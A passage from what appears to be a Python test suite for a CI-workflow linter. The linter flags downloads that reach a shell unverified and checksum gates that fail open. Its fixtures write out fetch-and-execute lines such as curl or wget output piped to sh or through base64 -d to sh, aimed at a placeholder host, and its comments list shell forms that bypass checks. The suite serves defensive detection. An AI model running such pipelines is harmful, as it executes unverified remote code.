                    ])
                    self.assertEqual(1, len(found), found)
                    self.assertIn("continue-on-error", found[0][1])

    def test_a_function_gate_in_a_soft_step_still_clears_a_same_step_use(self):
        for call in ("f() { GATE; }\nf\n", "f() { GATE; }\necho hi\nf\n"):
            check = call.replace("GATE", "( CHECK || exit 1 )").replace("CHECK", self.CHECK)
            for shell in (None, "bash", "sh"):
                with self.subTest(call=call, shell=shell):
                    self.assertEqual([], wg.job_defects([
                        wg.Step("get", self.FETCH),
                        wg.Step("check-use", check + self.USE, shell, None, True),
                    ]))

    def test_a_soft_step_keeps_the_shells_own_function_gate_refusal(self):
        call = "f() { ( CHECK || exit 1 ); }\nf\n".replace("CHECK", self.CHECK)
        for shell, prefix, reason in (("sh {0}", "", "starting without errexit"),
                                      (None, "set +e\n", "turning errexit off")):
            with self.subTest(shell=shell, prefix=prefix):
                found = wg.job_defects([
                    wg.Step("get", self.FETCH),
                    wg.Step("check-use", prefix + call + self.USE, shell, None, True),
                ])
                self.assertEqual(1, len(found), found)
                self.assertIn(reason, found[0][1])

    def test_a_soft_step_function_gate_does_not_clear_a_use_before_its_call(self):
        check = "f() { ( CHECK || exit 1 ); }\n".replace("CHECK", self.CHECK)
        for shell in (None, "bash", "sh"):
            with self.subTest(shell=shell):
                found = wg.job_defects([
                    wg.Step("get", self.FETCH),
                    wg.Step("use-check", check + self.USE + "f\n", shell, None, True),
                ])
                self.assertEqual(1, len(found), found)

    def test_a_rescued_function_gate_does_not_clear_a_later_step(self):
        check = "f() { ( CHECK || exit 1 ) || true; }\nf\n".replace("CHECK", self.CHECK)
        for shell in (None, "bash", "sh"):
            with self.subTest(shell=shell):
                found = wg.job_defects([
                    wg.Step("get", self.FETCH),
                    wg.Step("check", check, shell),
                    wg.Step("use", self.USE),
                ])
                self.assertEqual(1, len(found), found)

    def test_an_enclosing_pipeline_uses_the_steps_pipefail_state(self):
        for body in ("CHECK | cat\n", "{ ( CHECK || exit 1 ); } | cat\n"):
            for shell in (None, "sh"):
                with self.subTest(body=body, shell=shell):
                    self.assertTrue(self.job(body, shell))
            with self.subTest(body=body, shell="bash"):
                self.assertEqual([], self.job(body, "bash"))

    def test_a_rescue_inside_a_piped_group_is_not_credited_without_pipefail(self):
        # #2630: a checksum rescue written in a brace group or subshell that is
        # a pipeline stage sets only that stage's status; bash 3.2.57/5.2.21 and
        # dash run the use after the pipeline in the default and `sh` postures
        # (no pipefail), and `shell: bash` (`-eo pipefail`) alone stops the step.
        # Shape 5 is #2633's deferred piped function call, the same mechanism.
        pipefail_gated = (
            "{ CHECK || exit 1; } | cat\n",                          # 1
            "{\n  CHECK || exit 1\n} | cat\n",                       # 2
            "(\n  CHECK || exit 1\n) | cat\n",                       # 3
            "f() { { ( CHECK || exit 1 ); } | cat; }\nf\n",         # 4
            "f() { CHECK; }\n{ f; } | cat\n",                        # 5
            "f() { { CHECK || return 1; } | cat; }\nf\n",           # 7
        )
        for body in pipefail_gated:
            for shell in (None, "sh"):
                with self.subTest(body=body, shell=shell):
                    found = self.job(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("piped", found[0][1])
            with self.subTest(body=body, shell="bash"):
                self.assertEqual([], self.job(body, "bash"))
        # Shape 6's single-line piped subshell `( CHECK || exit 1 ) | cat` splits
        # by posture (#2631): WITHOUT pipefail it is a genuine fail-open -- the
        # pipeline takes `cat`'s zero and the use runs -- so it still reports under
        # the default and `sh` postures; `shell: bash` turns pipefail on, which
        # carries the rescued subshell's non-zero exit to the pipeline and stops
        # the step, so there it is cleared. Carrying the step's pipefail state
        # through the group-status walk is what now tells the postures apart.
        for shell in (None, "sh"):
            with self.subTest(body="( CHECK || exit 1 ) | cat\n", shell=shell):
                self.assertEqual(1, len(self.job("( CHECK || exit 1 ) | cat\n", shell)))
        with self.subTest(body="( CHECK || exit 1 ) | cat\n", shell="bash"):
            self.assertEqual([], self.job("( CHECK || exit 1 ) | cat\n", "bash"))

    def test_a_rescued_group_piped_onward_uses_the_steps_pipefail_state(self):
        # #2631: siblings of the #2627 baseline `{ ( CHECK || exit 1 ); } | cat`.
        # A rescue written inside a group or subshell that is piped onward sets
        # only that stage's status, which pipefail alone carries to the step, so
        # these split by posture -- reported without pipefail (the pipeline takes
        # the downstream command's zero and the use runs) and cleared under
        # `shell: bash`. The forms are an `echo ok`/`true` after the rescue, a
        # `|| return 1`, a stage that is itself a subshell, a nested piped group,
        # and a `&& use` on the pipeline. The piped FUNCTION call (`f | cat`) is
        # deferred to #2633 and an `if`/`while` test stays refused in every posture.
        def defects(body, shell):
            script = self.FETCH + body.replace("CHECK", self.CHECK) + (
                "" if "sh payload" in body else self.USE)
            return wg.job_defects([wg.Step("run", script, shell)])

        split = (
            "{ ( CHECK || exit 1 ); echo ok; } | cat\n",
            "( CHECK || exit 1 ) | cat\n",
            "{ ( CHECK || exit 1 ) ; true; } | cat\n",
            "{ ( CHECK || return 1 ); } | cat\n",
            "{ ( CHECK || exit 1 ); } | cat && sh payload\n",
            "{ { ( CHECK || exit 1 ); } | cat; } | cat\n",
            "{ ( CHECK || exit 1 ) | cat; }\n",
            "( ( CHECK || exit 1 ) ) | cat\n",
        )
        for body in split:
            for shell in (None, "sh"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual(1, len(defects(body, shell)), defects(body, shell))
            with self.subTest(body=body, shell="bash"):
                self.assertEqual([], defects(body, "bash"))
        # Non-piped siblings are safe in EVERY posture: errexit aborts the group
        # at the rescued subshell before the trailing command (`echo a | cat`),
        # and `&& use` skips the use when the group fails -- cleared with or
        # without pipefail.
        for body in ("{ ( CHECK || exit 1 ); echo a | cat; }\n",
                     "{ ( CHECK || exit 1 ); } && sh payload\n"):
            for shell in (None, "sh", "bash"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual([], defects(body, shell))
        # Must STAY reported in every posture -- genuine fail-opens where the use
        # runs even with pipefail: a swallowed pipeline (`|| true`), a negated
        # one, and a use in the concurrent piped-to stage.
        for body in ("{ ( CHECK || exit 1 ); } | cat || true\n",
                     "! { ( CHECK || exit 1 ); } | cat\n",
                     "{ ( CHECK || exit 1 ); } | { sh payload; }\n"):
            for shell in (None, "sh", "bash"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual(1, len(defects(body, shell)), defects(body, shell))

    def test_a_rescued_subshell_swallowed_or_continued_still_reports(self):
        # #2631 fix round: the SUBSHELL mirrors of the brace must-stay controls.
        # A rescue inside a bare/double `( )` subshell piped onward clears under
        # `shell: bash` like its `{ }` sibling -- but only while its non-zero exit
        # still stops the step. When a downstream `|| true` swallows the pipeline,
        # an `&& use` runs past it, or a trailing command inside an `&&`-LHS
        # subshell masks the rescue's exit, the use runs even with pipefail, so
        # these must STAY reported in EVERY posture. Ground truth (mark-first
        # stubs): the payload runs under bash 3.2.57 and 5.2.21 `-eo pipefail`,
        # bash `-e`, and `sh`. The `{ }` analogues are the must-stays the sibling
        # test already pins; these are the previously-unguarded `( )` spellings.
        def defects(body, shell):
            script = self.FETCH + body.replace("CHECK", self.CHECK) + (
                "" if "sh payload" in body else self.USE)
            return wg.job_defects([wg.Step("run", script, shell)])

        must_report = (
            "( CHECK || exit 1 ) | cat || true\n",               # swallowed pipeline
            "( ( CHECK || exit 1 ) ) | cat || true\n",           # nested, swallowed
            "( CHECK || exit 1 ; echo ok ) | cat || true\n",     # trailer, then swallowed
            "( CHECK || return 1; echo a | cat ) || true\n",     # return-rescue, swallowed
            "( ( CHECK || exit 1 ); echo ok ) && sh payload\n",  # masked exit, continued
            "( CHECK || return 1; true ) && sh payload\n",       # masked exit, continued
            "! ( CHECK || exit 1 ) | cat\n",                     # negated
            "( CHECK || exit 1 ) | { sh payload; }\n",           # use in the concurrent stage
        )
        for body in must_report:
            for shell in (None, "sh", "bash"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual(1, len(defects(body, shell)), defects(body, shell))
        # No over-correction. A bare subshell rescue with NO masking trailer still
        # gates `&& use` (its non-zero exit skips the use) -- cleared in every
        # posture -- and a plainly piped-onward subshell still SPLITS by posture
        # (cleared under bash's pipefail, reported without it), exactly as the
        # pinned `( CHECK || exit 1 ) | cat` does.
        for body in ("( CHECK || exit 1 ) && sh payload\n",):
            for shell in (None, "sh", "bash"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual([], defects(body, shell))
        for body in ("( CHECK || exit 1 ) | cat && sh payload\n",
                     "( CHECK || exit 1 ) | cat\n"):
            for shell in (None, "sh"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual(1, len(defects(body, shell)), defects(body, shell))
            with self.subTest(body=body, shell="bash"):
                self.assertEqual([], defects(body, "bash"))

    def test_the_piped_rescue_controls_keep_their_verdicts(self):
        # #2630 controls. Credited (pipefail carries the failed stage's status,
        # or there is no pipe and the exit stops the step):
        for body, shell in (("set -o pipefail\n{ CHECK || exit 1; } | cat\n", None),
                            ("set -o pipefail\n{ CHECK || exit 1; } | cat\n", "sh"),
                            ("{ CHECK || exit 1; }\n", None),
                            ("{ CHECK || exit 1; }\n", "sh"),
                            ("{ CHECK || exit 1; }\n", "bash")):
            with self.subTest(body=body, shell=shell):
                self.assertEqual([], self.job(body, shell))
        # Must-trip everywhere: `|| true` swallows the failure under every shell.
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual(1, len(self.job("CHECK || true\n", shell)))
        # A piped check with no rescue, and the nested-paren spelling #2627
        # fixed, report without pipefail and clear under `shell: bash`.
        for body in ("CHECK | cat\n", "{ ( CHECK || exit 1 ); } | cat\n"):
            for shell in (None, "sh"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual(1, len(self.job(body, shell)))
            with self.subTest(body=body, shell="bash"):
                self.assertEqual([], self.job(body, "bash"))

    def test_a_nested_groups_status_reaches_the_outer_exiting_rescue(self):
        for body in ("{ { CHECK && echo ok; }; } || exit 1\n",
                     "{ { { CHECK && echo ok; }; }; } || exit 1\n",
                     "{\n  {\n    CHECK && echo ok\n  }\n} || exit 1\n"):
            with self.subTest(body=body):
                self.assertIsNone(self.finding(body))

    def test_the_nested_group_controls_still_report(self):
        for body in ("{ { CHECK && echo ok; }; };\n",
                     "{ { CHECK && echo ok; }; } && echo recovered\n",
                     "{ { CHECK && echo ok; }; } || true\n"):
            with self.subTest(body=body):
                self.assertIsNotNone(self.finding(body))


class TestACompoundCommandFeedsItsClosingPipeline(unittest.TestCase):
    """#2430: a compound command's stdout belongs to its closing pipe."""

    URL = "https://example.test/install.sh"
    FETCH = "curl -fsSL %s" % URL

    def assert_reported(self, script):
        why = wg.fetch_exec_defects(script)
        self.assertEqual(1, len(why), why)
        self.assertIn("hands %s straight to `sh`" % self.URL, why[0])

    def test_groups_and_branches_feed_the_executor_after_the_close(self):
        for script in (
                "{ %s; } | sh\n" % self.FETCH,
                "{\n%s\n} | sh\n" % self.FETCH,
                "(\n%s\n) | sh\n" % self.FETCH,
                "if true; then\n%s\nfi | sh\n" % self.FETCH,
                "while true; do\n%s\nbreak\ndone | sh\n" % self.FETCH,
                "for value in one; do\n%s\ndone | sh\n" % self.FETCH,
                "{ { %s; }; } | sh\n" % self.FETCH,
                "{ { %s; } | sh; }\n" % self.FETCH,
                "{ { %s; } | cat; } | sh\n" % self.FETCH,
                "{ %s | cat; } | sh\n" % self.FETCH,
                "{ %s | tee install.sh; } | sh\n" % self.FETCH,
                "{ %s | sha256sum; } | sh\n" % self.FETCH,
        ):
            with self.subTest(script=script):
                self.assert_reported(script)

    def test_case_arms_feed_the_executor_after_esac(self):
        for arm in ("x)", "x | y)", "( x | y )"):
            script = "case x in\n  %s %s;;\nesac | sh\n" % (arm, self.FETCH)
            with self.subTest(arm=arm):
                self.assert_reported(script)
        self.assert_reported(
            "case x in x) %s;; esac | tee install.sh | sh\n" % self.FETCH
        )

    def test_a_carried_download_printed_inside_the_compound_is_reported(self):
        assignment = "payload=$(%s)\n" % self.FETCH
        for compound in ("{ echo \"$payload\"; } | sh\n",
                         "{\necho \"$payload\"\n} | sh\n",
                         "(\necho \"$payload\"\n) | sh\n",
                         "case x in\n x) echo \"$payload\";;\nesac | sh\n",
                         "{ { echo \"$payload\"; }; } | sh\n"):
            with self.subTest(compound=compound):
                why = wg.fetch_exec_defects(assignment + compound)
                self.assertEqual(1, len(why), why)
                self.assertIn("carries %s in `$payload`" % self.URL, why[0])

    def test_a_local_stdout_redirect_disconnects_a_carried_printer(self):
        assignment = "payload=$(%s)\n" % self.FETCH
        for compound in ("{ echo \"$payload\" > f; } | sh\n",
                         "{ echo \"$payload\" >f; } | sh\n",
                         "{ echo \"$payload\" 1>f; } | sh\n",
                         "{ echo \"$payload\" >>f; } | sh\n",
                         "{ printf '%s' \"$payload\" >f; } | sh\n",
                         "case x in x) echo \"$payload\" >f;; esac | sh\n"):
            with self.subTest(compound=compound):
                self.assertEqual([], wg.fetch_exec_defects(assignment + compound))
        why = wg.fetch_exec_defects(assignment + "{ echo \"$payload\" 2>f; } | sh\n")
        self.assertEqual(1, len(why), why)
        self.assertIn("carries %s in `$payload`" % self.URL, why[0])

    def test_nonexecutors_disconnected_streams_and_local_filters_stay_clean(self):
        for script in (
                "{ %s; } | tee install.sh\n" % self.FETCH,
                "{ %s > install.sh; } | sh\n" % self.FETCH,
                "{ %s; } | sh < local.sh\n" % self.FETCH,
                "{ %s | cat > install.sh; } | sh\n" % self.FETCH,
                "case x in x) %s;; esac | tee install.sh\n" % self.FETCH,
                "case x in x) %s;; esac | sh < local.sh\n" % self.FETCH,
                "{ %s; }\nif true; then :; fi | sh\n" % self.FETCH,
                "{ %s; if true; then echo safe; fi | sh; }\n" % self.FETCH,
                "%s\n{ echo safe; } | sh\n" % self.FETCH,
                "{ { %s; } > install.sh; } | sh\n" % self.FETCH,
                "{ { %s; } | cat > install.sh; } | sh\n" % self.FETCH,
                "{ { %s; }; } > install.sh | sh\n" % self.FETCH,
                "payload=$(%s)\n{ { echo \"$payload\"; } > install.sh; } | sh\n"
                % self.FETCH,
                "payload=$(%s)\n{ { echo \"$payload\"; } | cat > install.sh; } | sh\n"
                % self.FETCH,
        ):
            with self.subTest(script=script):
                self.assertEqual([], wg.fetch_exec_defects(script))


class TestPipelineStreamProvenance(unittest.TestCase):
    URL = "https://example.test/install"

    def test_stdout_aliases_follow_ordered_pipeline_provenance(self):
        for script in ("curl -fsSL %s >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s >/dev/fd/1 | sh" % self.URL,
                       "curl -fsSL %s 3>&1 >/dev/null >&3 | sh" % self.URL,
                       "curl -fsSL %s | cat >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s | cat 3>&1 >/dev/null >&3 | sh" % self.URL,
                       "curl -fsSL %s | tee install.sh >/dev/fd/1 | sh" % self.URL):
            with self.subTest(script=script):
                self.assertTrue(wg.fetch_exec_defects(script))
        for script in ("curl -fsSL %s >/dev/stdout >saved | sh" % self.URL,
                       "curl -fsSL %s >/dev/null >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s | cat >saved >/dev/fd/1 | sh" % self.URL,
                       "curl -fsSL %s -o saved >/dev/stdout | sh" % self.URL):
            with self.subTest(script=script):
                self.assertFalse(wg.fetch_exec_defects(script))
        self.assertEqual("saved", wg.fetches(
            "curl -fsSL %s >saved >/dev/stdout | sh" % self.URL)[0].dest)

    def test_stdin_aliases_and_saved_descriptors(self):
        for suffix in ("cat /dev/stdin | sh", "cat /dev/fd/0 | sh",
                       "sed s/x/x/ /dev/stdin | sh", "cat </dev/stdin | sh",
                       "cat </dev/fd/0 | sh", "sh </dev/stdin", "sh </dev/fd/0",
                       "sh 3<&0 <local </dev/fd/3",
                       "cat 3<&0 <local </dev/fd/3 | sh",
                       "cat 3<&0 <local /dev/fd/3 | sh",
                       "sed s/x/x/ 3<&0 <local /dev/fd/3 | sh",
                       "sed s/x/x/ local /dev/stdin | sh",
                       "cat /dev/./stdin | sh", "cat /dev/fd/$FD | sh",
                       "cat /proc/self/fd/0 | sh", "sh </dev/fd/$FD",
                       "cat <local $INPUT | sh"):
            with self.subTest(suffix=suffix):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))
        for suffix in ("sh <local </dev/stdin", "sh </dev/stdin <local",
                       "cat <local /dev/stdin | sh",
                       "cat 3<local /dev/fd/3 | sh",
                       "sed s/x/x/ <local /dev/fd/0 | sh"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))

    def test_custom_filter_forwarding_and_disconnection(self):
        prefix = "curl -fsSL %s | ./custom-filter --mode decode" % self.URL
        self.assertTrue(wg.fetch_exec_defects(prefix + " | sh"))
        for suffix in ("", " <local | sh", " >saved | sh"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(prefix + suffix))

    def test_forwarding_stages_reach_executors(self):
        for stages in ("cat | sh", "cat saved - | sh", "tee install.sh | sh",
                       "tr a-z A-Z | bash", "sed s/a/b/ | python3 -",
                       "cat | tee install.sh | bash", "head -c 1024 | sh",
                       "base64 -d | sh"):
            with self.subTest(stages=stages):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, stages)))

    def test_read_only_and_disconnected_streams(self):
        for script in ("curl -fsSL %s | cat" % self.URL,
                       "curl -fsSL %s | head -c 1024" % self.URL,
                       "curl -fsSL %s | cat > saved | sh" % self.URL,
                       "curl -fsSL %s | head -c 10 < local | sh" % self.URL,
                       "curl -fsSL %s | head -c 10 > saved | sh" % self.URL,
                       "curl -fsSL %s | cat saved | sh" % self.URL,
                       "curl -fsSL %s | sed s/a/b/ saved | sh" % self.URL,
                       "curl -fsSL %s | cat | sh < local" % self.URL,
                       "curl -fsSL %s -o saved | cat | sh" % self.URL,
                       "curl -fsSL %s -o /dev/null | cat | sh" % self.URL,
                       "curl -fsSL %s > saved | cat | sh" % self.URL):
            with self.subTest(script=script):
                self.assertFalse(wg.fetch_exec_defects(script))

    def test_tee_still_names_the_file_it_writes(self):
        script = "curl -fsSL %s | tee install.sh | sh" % self.URL
        self.assertEqual("install.sh", wg.fetches(script)[0].dest)
        self.assertTrue(wg.fetch_exec_defects(script))

    def test_wget_stdout_and_tee_without_executor(self):
        self.assertTrue(wg.fetch_exec_defects(
            "wget -qO- %s | cat | sh" % self.URL))
        self.assertFalse(wg.fetch_exec_defects(
            "curl -fsSL %s | tee install.sh" % self.URL))

    def test_pipeline_inside_a_substitution_is_still_executed(self):
        self.assertTrue(wg.fetch_exec_defects(
            'echo "$(curl -fsSL %s | cat | sh)"' % self.URL))

    def test_only_final_descriptor_zero_provenance_disconnects_the_pipe(self):
        for suffix in ("cat 3<local | sh", "cat | sh 3<local",
                       "sh 3<local", "sh 3<<EOF\necho safe\nEOF",
                       "cat 3<&0 0<local 0<&3 | sh",
                       "cat 3<&0 <<EOF 0<&3 | sh\necho safe\nEOF",
                       "cat | sh 3<&0 <<EOF 0<&3\necho safe\nEOF",
                       "cat | sh 3<<EOF\necho safe\nEOF"):
            with self.subTest(suffix=suffix):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))
        # The delimiter is QUOTED wherever the body is what `sh` runs: an
        # EXPANDING script on an interpreter's stdin is reported unread in its
        # own right (#1839, and `TestTheGapsTheGuardDocuments`), which is a
        # different claim from the one under test here -- that the download
        # these steps pipe is not what the interpreter reads.
        for suffix in ("cat | sh <<'EOF'\necho safe\nEOF",
                       "sh <<'EOF'\necho safe\nEOF", "sh <local",
                       "cat 3<&0 0<local | sh",
                       "cat 0<&3 3<&0 | sh",
                       "cat | sh 3<&0 0<&3 <<'EOF'\necho safe\nEOF",
                       "cat 3<&0 0<&3 <<'EOF' | sh\necho safe\nEOF"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))
        # The same shape, UNQUOTED: fd 0's FINAL state still disconnects the download from `sh`,
        # but now `cat`'s own heredoc is EXPANDING, a different, genuine defect from the one this
        # test is about (a printer handed down the pipe, `handed`, #2467).
        found = wg.fetch_exec_defects(
            "curl -fsSL %s | cat 3<&0 0<&3 <<EOF | sh\necho safe\nEOF\n" % self.URL)
        self.assertEqual(1, len(found), found)
        self.assertIn("EXPANDING heredoc", found[0])


class TestTheMessageSaysWhatWasChecked(unittest.TestCase):
    """#1697: one sentence was doing four jobs.

    "the step's checksum does not name X" was printed whenever no checksum
    CLEARED the fetch -- including when one named it exactly and was refused
    for a different reason (swallowed, soft, under another `if:`). The author
    reading it goes looking for a naming bug in a line that names the file
    correctly, and the control's real objection never reaches them. And the
    scope has been the JOB since M5, so "the step's" was wrong twice over.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX
    EXEC = "chmod +x /tmp/payload\n"

    def why(self, *steps):
        found = wg.job_defects(list(steps))
        self.assertEqual(1, len(found), found)
        return found[0][1]

    def test_no_checksum_in_the_job_names_it(self):
        why = self.why(("get", self.FETCH),
                       ("check", 'echo "%s  /tmp/other" | sha256sum -c -\n'
                                 % OTHER_HEX),
                       ("run", self.EXEC))
        self.assertIn("no checksum in the job names", why)

    def test_a_checksum_that_names_it_and_was_swallowed(self):
        why = self.why(("get", self.FETCH),
                       ("check", self.CHECK.rstrip("\n") + " || true\n"),
                       ("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("`||` branch", why)
        self.assertNotIn("does not name", why)

    def test_a_checksum_that_names_it_and_carries_no_digest(self):
        # `$FILE` is an expansion, not an expectation: the checked text names
        # the download and says nothing about what should have arrived.
        why = self.why(("get", self.FETCH),
                       ("check", 'echo "$FILE  /tmp/payload" | sha256sum -c -\n'),
                       ("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("no digest", why)

    def test_a_checksum_that_names_it_under_another_condition(self):
        why = self.why(wg.Step("get", self.FETCH),
                       wg.Step("check", self.CHECK, None, "github.ref == 'main'"),
                       wg.Step("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("`if:`", why)

    def test_a_checksum_that_names_it_in_a_soft_step(self):
        why = self.why(wg.Step("get", self.FETCH),
                       wg.Step("check", self.CHECK, None, None, True),
                       wg.Step("run", self.EXEC))
        self.assertIn("continue-on-error", why)

    def test_the_scope_is_never_called_the_step(self):
        for why in (self.why(("get", self.FETCH), ("run", self.EXEC)),
                    self.why(("get", self.FETCH),
                             ("check", 'echo "%s  /tmp/other" | sha256sum -c -\n'
                                       % OTHER_HEX),
                             ("run", self.EXEC))):
            self.assertNotIn("the step's checksum", why)


class TestABranchIsNotAlwaysTaken(unittest.TestCase):
    """#1697 item 3: a `sha256sum -c` inside a `then` branch may not run.

    The reader is flat -- it produces statements, not a tree -- but the words
    that open and close a body (`then`, `else`, `do`, `fi`, `done`) are right
    there in the argv it produced, so "written inside a branch" is a question
    it can answer. This is the shell twin of the `if:` on a step (`_binds`),
    and it is refused for the same reason: a check that may be skipped cannot
    clear an execution that is not.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX
    EXEC = "chmod +x /tmp/payload\n"

    def test_a_check_inside_a_then_branch_clears_nothing_outside_it(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "fi\n" + self.EXEC))

    def test_a_check_inside_a_loop_body_clears_nothing_outside_it(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "for f in x; do\n" + self.CHECK + "done\n" + self.EXEC))

    def test_the_same_branch_as_the_use_still_binds(self):
        # The hardened spelling: fetch, check and use share one body, so they
        # run together or not at all -- refusing this would push authors off
        # the rule instead of onto it.
        self.assertIsNone(wg.fetch_exec_defect(
            "if true; then\n" + self.FETCH + self.CHECK + self.EXEC + "fi\n"))

    def test_a_then_branch_does_not_clear_an_else_branch(self):
        # The check runs FIRST in statement order, so ordering is not what
        # refuses it: the two bodies are alternatives.
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "else\n" +
            self.EXEC + "fi\n"))

    def test_a_check_after_the_fi_still_binds(self):
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then :; fi\n" + self.CHECK + self.EXEC))

    def test_a_nested_branch_does_not_clear_its_parent(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + "if true; then\n" + self.CHECK +
            "fi\n" + self.EXEC + "fi\n"))

    # `case` arms are branch bodies too, and after the `if`/`else` twin was
    # refused this was the one spelling left that still bought the credit.
    CASE_SPLIT = ("case $x in\n"
                  " a)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  " b)\n"
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX

    def test_one_arm_of_a_case_does_not_clear_another(self):
        self.assertIsNotNone(wg.fetch_exec_defect(self.CASE_SPLIT))

    def test_an_arm_written_on_one_line_is_read_at_all(self):
        # `a) curl …` puts the pattern where the command was expected, which
        # hid the fetch itself -- the same class as `then` and `f() {`.
        script = ("case $x in\n"
                  " a) curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '    echo "%s  /tmp/payload" | sha256sum -c - ;;\n'
                  " b) chmod +x /tmp/payload ;;\n"
                  "esac\n") % HEX
        self.assertEqual(1, len(wg.fetches(script)), wg.fetches(script))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_one_arm_holding_all_three_still_binds(self):
        script = ("case $x in\n"
                  " a)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_an_alternation_pattern_still_opens_a_new_arm(self):
        script = ("case $x in\n"
                  " a|b)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  " c)\n"
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_quoted_multi_word_arm_patterns_still_open_their_own_arms(self):
        # Round-2 re-review: the arm regex forbade whitespace, so a pattern
        # written `"a b")` -- one word carrying a space once the quotes are
        # read -- did not open an arm. With ONE such arm the `case` keyword's
        # own body still separated it from the next recognised arm; with two,
        # both bodies shared that region and a check in one cleared a use in
        # the other.
        script = ("case $x in\n"
                  ' "a b")\n'
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  ' "c d")\n'
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        stmts = shell_reader.statements(script)
        bodies = workflow_forms.regions(stmts)
        fetch = next(i for i, st in enumerate(stmts)
                     if st.stages[0].argv and st.stages[0].argv[0] == "curl")
        run = next(i for i, st in enumerate(stmts)
                   if st.stages[0].argv and st.stages[0].argv[0] == "chmod")
        self.assertNotEqual(bodies.get(fetch), bodies.get(run), bodies)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_check_after_the_esac_still_binds(self):
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + "case $x in\n a)\n   :\n   ;;\nesac\n" +
            self.CHECK + self.EXEC))

    # Every terminator that ENDS an arm, not just `;;`. Reading only `;;`
    # left the parser expecting a body, so the next arm's `b)` closed a
    # subshell that was never opened and `b` became the command -- which
    # SHADOWED the `curl` behind it, and a guard that sees no download
    # reports a clean step (fix round on #1714, Critical 2).
    TERMINATORS = (";;", ";&", ";;&")

    def test_a_terminator_does_not_hide_the_next_arms_command(self):
        for terminator in self.TERMINATORS:
            script = ("case $x in a) echo hi %s b) %s esac\n"
                      % (terminator, self.FETCH.replace("\n", " ;; ")))
            with self.subTest(terminator=terminator):
                fetches = wg.fetches(script)
                self.assertEqual(1, len(fetches), fetches)
                self.assertEqual("/tmp/payload", fetches[0].dest)

    def test_a_terminator_still_opens_a_NEW_arm(self):
        # The other half: the reset has to put a BOUNDARY there too, or a
        # check in one arm clears a use in the next. `;&` falls through at
        # run time, but only when the FIRST pattern matched -- arriving at
        # `b)` directly runs no check at all, so the arms stay separate.
        for terminator in self.TERMINATORS:
            script = ("case $x in\n a)\n   " + self.FETCH + "   " +
                      self.CHECK + "   " + terminator + "\n b)\n   " +
                      self.EXEC + "   ;;\nesac\n")
            with self.subTest(terminator=terminator):
                self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_the_message_says_it_was_the_branch(self):
        why = wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "fi\n" + self.EXEC)
        self.assertIn("the checksum that names", why)
        self.assertIn("branch", why)

    def test_a_branch_in_one_step_does_not_reach_into_the_next(self):
        # Each step is its own shell invocation, so an unterminated `if` in
        # step A must not make step B's checksum look conditional.
        self.assertEqual([], wg.job_defects(
            [("a", "if true; then :; fi\n"),
             ("b", self.FETCH + self.CHECK + self.EXEC)]))


class TestAScriptsKeywordsAreItsOwn(unittest.TestCase):
    """Review I-3 of the #1793 follow-ups: `regions` read the keywords of a
    script handed to a shell as the step's own, so the `fi` in
    `sh <<< 'fi' || true` closed the loop around it, and the checksum after
    it read as unconditional. With X unset, bash 3.2 and 5.2 skip the loop and
